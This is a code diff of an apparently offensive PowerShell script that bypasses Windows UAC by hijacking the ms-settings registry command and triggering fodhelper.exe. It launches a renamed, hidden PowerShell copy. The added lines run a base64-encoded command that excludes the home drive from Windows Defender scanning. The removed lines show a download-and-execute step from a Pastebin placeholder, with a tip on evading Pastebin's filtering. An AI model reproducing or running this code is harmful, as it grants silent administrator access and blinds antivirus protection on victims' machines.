@@ -25,18 +25,9 @@ try {
     exit
 }
 
-# Generate a unique text file name and download the file
-$uniqueTxtName = [guid]::NewGuid().ToString() + ".txt"
-$outPathTxt = Join-Path -Path $hiddenFolderPath -ChildPath $uniqueTxtName
-
-# PasteBin Link
-$PasteBin = "Your PasteBin" #PasteBin blocks malicious scripts, so you might have to use some other methods to host the powershell script
-
-
 # Generate a unique name for a copied PowerShell executable
-$uniqueExeNamePowershell = [guid]::NewGuid().ToString()
-$fullUniqueExePowershell = $uniqueExeNamePowershell + ".exe"
-$destinationPathPowershell = Join-Path -Path $hiddenFolderPath -ChildPath $fullUniqueExePowershell
+$uniqueExeNamePowershell = [guid]::NewGuid().ToString() + ".exe"
+$destinationPathPowershell = Join-Path -Path $hiddenFolderPath -ChildPath $uniqueExeNamePowershell
 
 try {
     # Copy PowerShell.exe to the hidden folder with a unique name
@@ -53,6 +44,9 @@ try {
     exit
 }
 
+# Base64-encoded command to exclude $env:HOMEDRIVE from Defender
+$DefenderExclusionBase64 = "UwBlAHQALQBNAHAAUAByAGUAZgBlAHIAZQBuAGMAZQAgAC0ARQB4AGMAbAB1AHMAaQBvAG4AUABhAHQAaAAgACQAZQBuAHYAOgBIAE8ATQBFAEQAUgBJAFYARQA="
+
 # Create a registry key for a custom command
 $regKeyPath = "HKCU:\Software\Classes\ms-settings\Shell\open\command"
 
@@ -61,21 +55,17 @@ try {
     New-Item -Path $regKeyPath -Force | Out-Null
     New-ItemProperty -Path $regKeyPath -Name "DelegateExecute" -Value "" -Force | Out-Null
 
-    # Defining the command to be placed in the registry
-    #Uncomment/Comment Accordingly
-    $command = "$destinationPathPowershell -Command `"echo 'PWNED'; Read-Host;`"" #used for testing if bypass works
-    #$command = "$destinationPathPowershell -WindowStyle Hidden -Command `"irm '$($PasteBin)' | iex`"" #with -WindowStyle Hidden
-    #$command = "$destinationPathPowershell -Command `"irm '$($PasteBin)' | iex`"" #without -WindowStyle Hidden
+    # Define the payload command
+    $command = "$destinationPathPowershell -WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand $DefenderExclusionBase64"
 
-
-    Set-ItemProperty -Path $regKeyPath -Name "(default)" -Value $command -Force
+    Set-ItemProperty -Path $regKeyPath -Name "(Default)" -Value $command -Force
     Write-Host "Registry key created and command set."
 } catch {
     Write-Error "Failed to configure the registry key. Exiting script."
     exit
 }
 
-# Trigger
+# Trigger UAC bypass via Fodhelper
 try {
     $fodhelperPath = "C:\Windows\System32\fodhelper.exe"
     if (Test-Path $fodhelperPath) {
@@ -92,7 +82,7 @@ try {
 
 # Dynamic Wait
 try {
-    #check if PowerShell executable is still running
+    # Check if PowerShell executable is still running
     $isPowershellRunning = $true
     Write-Host "Executing UAC-Bypassed Powershell w/ FodHelper-Registry-set-command: $($command)"
     while ($isPowershellRunning) {
@@ -135,3 +125,4 @@ try {
 # Script completed successfully
 Write-Host "Script completed. All operations executed."
 exit
+
